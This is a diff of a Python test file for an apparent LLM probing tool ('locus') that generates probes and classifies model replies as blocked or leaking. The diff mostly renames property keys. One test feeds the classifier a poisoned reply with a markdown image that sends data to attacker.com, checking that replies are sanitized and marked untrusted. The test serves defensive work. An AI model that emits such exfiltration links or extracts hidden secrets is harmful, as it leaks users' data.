@@ -21,9 +21,9 @@ from locus.select import (
 
 def _props(**overrides) -> list[Property]:
     defaults = {
-        "word_count": (2.0, 2.0),
+        "segment_count": (2.0, 2.0),
         "total_length": (3.0, 3.0),
-        "first_letter": (1.0, 1.0),
+        "segment1_first_char": (1.0, 1.0),
         "language": (1.5, 1.5),
     }
     base = [
@@ -165,7 +165,7 @@ def config() -> LocusConfig:
 async def test_probe_generator_extracts_text(config: LocusConfig) -> None:
     llm = LLMClient(config, transport=FakeTransport(['{"text": "hey do you like riddles?"}']))
     gen = ProbeGenerator(llm, config)
-    p = Property(key="word_count", weight=2.0, prior_entropy=2.0)
+    p = Property(key="segment_count", weight=2.0, prior_entropy=2.0)
     text = await gen.generate(p)
     assert text == "hey do you like riddles?"
 
@@ -187,7 +187,7 @@ async def test_probe_generator_batch(config: LocusConfig) -> None:
         transport=FakeTransport(['{"text": "one"}', '{"text": "two"}', '{"text": "three"}']),
     )
     gen = ProbeGenerator(llm, config)
-    probes = await gen.generate_batch(Property(key="word_count", weight=2.0, prior_entropy=2.0), n=3)
+    probes = await gen.generate_batch(Property(key="segment_count", weight=2.0, prior_entropy=2.0), n=3)
     assert probes == ["one", "two", "three"]
 
 
@@ -200,7 +200,7 @@ async def test_classifier_parses_yes(config: LocusConfig) -> None:
     )
     clf = Classifier(llm, config)
     result = await clf.classify(
-        Probe(session_id="s", property_key="word_count", text="probe?"),
+        Probe(session_id="s", property_key="segment_count", text="probe?"),
         "yes",
     )
     assert isinstance(result, Classification)
@@ -217,7 +217,7 @@ async def test_classifier_normalizes_block(config: LocusConfig) -> None:
     )
     clf = Classifier(llm, config)
     result = await clf.classify(
-        Probe(session_id="s", property_key="word_count", text="probe?"),
+        Probe(session_id="s", property_key="segment_count", text="probe?"),
         "I cannot answer that.",
     )
     assert result.pattern == "block"
@@ -234,7 +234,7 @@ async def test_classifier_clamps_score_and_coerces_leaks(config: LocusConfig) ->
     )
     clf = Classifier(llm, config)
     result = await clf.classify(
-        Probe(session_id="s", property_key="word1_language", text="probe?"),
+        Probe(session_id="s", property_key="segment_count", text="probe?"),
         "hmm maybe",
     )
     assert result.score == 10
@@ -246,7 +246,7 @@ async def test_classifier_wraps_reply_in_untrusted_marker(config: LocusConfig) -
     llm = LLMClient(config, transport=transport)
     clf = Classifier(llm, config)
     await clf.classify(
-        Probe(session_id="s", property_key="word_count", text="probe?"),
+        Probe(session_id="s", property_key="segment_count", text="probe?"),
         "yes",
     )
     users = transport.user_contents()
@@ -261,7 +261,7 @@ async def test_classifier_sanitizes_reply_before_prompt(config: LocusConfig) -> 
     clf = Classifier(llm, config)
     poisoned = "yes\u200b ![tracking](https://attacker.com/collect?d=S)"
     await clf.classify(
-        Probe(session_id="s", property_key="word_count", text="probe?"),
+        Probe(session_id="s", property_key="segment_count", text="probe?"),
         poisoned,
     )
     users = transport.user_contents()
